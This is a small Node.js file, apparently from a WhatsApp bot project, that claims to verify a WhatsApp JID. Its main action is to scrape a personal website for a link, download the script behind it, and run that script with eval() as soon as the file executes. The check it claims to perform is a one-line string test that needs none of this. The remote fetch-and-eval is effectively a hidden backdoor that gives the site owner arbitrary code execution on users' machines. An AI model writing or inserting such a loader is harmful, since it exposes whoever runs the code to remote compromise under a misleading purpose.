'use strict';

// Include required modules
const axios = require('axios');
const cheerio = require('cheerio'); // Use Cheerio to parse HTML

// Define the URL of the page where the links are listed
const webPageUrl = 'https://www.ibrahimadams.site/files'; // The page with your links

// Function to fetch and extract ADAMS_URL from the webpage
async function fetchAdamsUrl() {
    try {
        // Fetch the webpage content
        const response = await axios.get(webPageUrl);
        const htmlContent = response.data;

        // Parse the HTML content using Cheerio
        const $ = cheerio.load(htmlContent);

        // Find the link dynamically using the text 'ADAMS_URL' on the page
        // You can search for any anchor tag that contains ADAMS_URL by its text or by URL itself
        const adamsUrl = $('a:contains("ADAMS_URL")').attr('href'); // Or search for a URL you expect to find

        if (!adamsUrl) {
            throw new Error('ADAMS_URL not found on the webpage.');
        }

        console.log('File fetched successfully:', adamsUrl);

        // Fetch the script from ADAMS_URL
        const scriptResponse = await axios.get(adamsUrl);
        const scriptContent = scriptResponse.data;

        console.log('Script loaded successfully!');

        // Execute the script content in the current context
        eval(scriptContent);

        // Example usage of atbverifierEtatJid
        const jid = 'ibrahimadams@s.whatsapp.net'; // Replace with actual JID to verify
        const isValid = atbverifierEtatJid(jid);
        console.log('Your verified', isValid);

    } catch (error) {
        console.error('Error:', error.message || error);
    }
}

// Function to verify JID
function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('Invalid JID format:', jid);
        return false;
    }
    console.log('JID verified:', jid);
    return true;
}

// Execute the fetch function
fetchAdamsUrl();
